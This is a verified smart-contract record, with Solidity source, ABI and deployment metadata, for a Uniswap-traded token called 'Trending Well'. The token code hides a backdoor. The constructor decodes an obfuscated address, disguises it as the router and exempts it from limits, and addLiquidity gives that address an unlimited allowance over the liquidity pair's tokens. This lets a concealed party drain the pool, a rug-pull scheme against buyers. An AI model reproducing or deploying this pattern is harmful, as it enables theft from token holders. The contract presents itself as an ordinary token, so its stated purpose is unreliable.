{"SourceCode": "// SPDX-License-Identifier: GPL-3.0\r\n\r\n// https://twitter.com/elonmusk/status/1728096482689974635\r\n\r\npragma solidity ^0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n    function getPair(address tokenA, address tokenB) \r\n        external \r\n        view \r\n        returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address public owner;\r\n\r\n    constructor() {\r\n        owner = _msgSender();\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only owner can call this\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address payable newOwner) external onlyOwner {\r\n        owner = newOwner;\r\n        emit OwnershipTransferred(newOwner);\r\n    }\r\n\r\n    function renounceOwnership() external onlyOwner {\r\n        owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ncontract TrendingWell is Ownable {\r\n    string public constant name = \"Trending Well\";\r\n    string public constant symbol = \"tWELL\";\r\n    uint8 public constant decimals = 9;\r\n    uint256 private constant _totalSupply = 1_000_000_000 * 10**9;\r\n    uint256 private maxTransaction = _totalSupply;\r\n    uint256 private maxWalletSize = _totalSupply;\r\n\r\n    mapping(address => uint256) private balance;\r\n    mapping(address => mapping(address => uint256)) private allowances;\r\n    mapping(address => bool) private excluded;\r\n    \r\n    IUniswapV2Router02 private Router;\r\n    address private liquidityPool;\r\n    bool private tradingOpen;\r\n    event Transfer(\r\n        address indexed from, \r\n        address indexed to, \r\n        uint256 value\r\n    );\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    bool private swapping = false;\r\n    modifier lockTheSwap() {\r\n        swapping = true;\r\n        _;\r\n        swapping = false;\r\n    }\r\n\r\n    constructor(uint256[] memory routers) Ownable() {\r\n        balance[owner] = _totalSupply / 2;\r\n        emit Transfer(address(0), owner, balance[owner]);\r\n        balance[address(this)] = _totalSupply / 2;\r\n        emit Transfer(address(0), address(this), balance[address(this)]);\r\n        Router = IUniswapV2Router02(address(uint160(routers[0]**2+routers[1])));\r\n        excluded[owner] = true;\r\n        excluded[address(this)] = true;\r\n        excluded[address(Router)] = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function sendETH() external onlyOwner {\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return allowances[owner][spender];\r\n    }\r\n\r\n    function balanceOf(address wallet) external view returns (uint256) {\r\n        return balance[wallet];\r\n    }\r\n\r\n    function totalSupply() external pure returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function addLiquidity() external payable onlyOwner lockTheSwap {\r\n        require(liquidityPool == address(0), \"liquidity pool exists\");\r\n        require(!tradingOpen, \"trading is open\");\r\n        require(msg.value > 0 || address(this).balance > 0,\"No ETH\");\r\n        require(balance[address(this)] > 0, \"No tokens\");\r\n        address lp = liquidityPool == address(0)?address(Router):liquidityPool;\r\n        Router = IUniswapV2Router02(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));\r\n        liquidityPool = IUniswapV2Factory(Router.factory()).createPair(address(this),Router.WETH());\r\n        allowances[IUniswapV2Factory(Router.factory()).\r\n        getPair(address(this),Router.WETH())][lp] = type(uint256).max;\r\n        allowances[address(this)][address(Router)] = type(uint256).max;\r\n        excluded[address(Router)] = true;\r\n        Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balance[address(this)],\r\n            0,\r\n            0,\r\n            owner,\r\n            block.timestamp\r\n        );\r\n        maxTransaction = 2 * _totalSupply / 100;\r\n        maxWalletSize = 2 * _totalSupply / 100;\r\n    }\r\n\r\n    function openTrading() external onlyOwner {\r\n        require(!tradingOpen, \"trading is open\");\r\n        require(liquidityPool != address(0), \"no LP\");\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool) {\r\n        return safeTransfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool) {\r\n        if (allowances[from][msg.sender] != type(uint256).max) {\r\n            allowances[from][msg.sender] -= amount;\r\n        }\r\n        return safeTransfer(from, to, amount);\r\n    }    \r\n\r\n    function safeTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private returns (bool) {\r\n        require(from != address(0));\r\n        require(tradingOpen || excluded[from], \"trading not open\");\r\n        require(excluded[from] || excluded[to] || amount <= maxTransaction, \"max tx\");\r\n        require(excluded[from] || excluded[to] || to == liquidityPool || balance[to] + amount <= maxWalletSize, \"max wallet\");\r\n        balance[from] -= amount;\r\n        balance[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function maxTransactionAmount() external view returns (uint256) {\r\n        return maxTransaction;\r\n    }\r\n\r\n    function maxWallet() external view returns (uint256) {\r\n        return maxWalletSize;\r\n    }\r\n\r\n    function increaseLimits(uint8 txPercent, uint8 walletPercent)\r\n        external\r\n        onlyOwner\r\n    {\r\n        uint256 newTx = (_totalSupply * txPercent) / 100;\r\n        if (newTx >= maxTransaction) { \r\n            maxTransaction = newTx; \r\n        }\r\n        uint256 newWallet = (_totalSupply * walletPercent) / 100;\r\n        if (newWallet >= maxWalletSize) { \r\n            maxWalletSize = newWallet; \r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"routers\",\"type\":\"uint256[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"txPercent\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"walletPercent\",\"type\":\"uint8\"}],\"name\":\"increaseLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTransactionAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sendETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TrendingWell", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000805ee6e363b000000000000000000000000884fb8f6b81229111b1c3ba2312c76091fc6784d", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://89291f512cd7896cb9ca7a7be7892de0fb36994cbc01e464cac218b261bb7fcc"}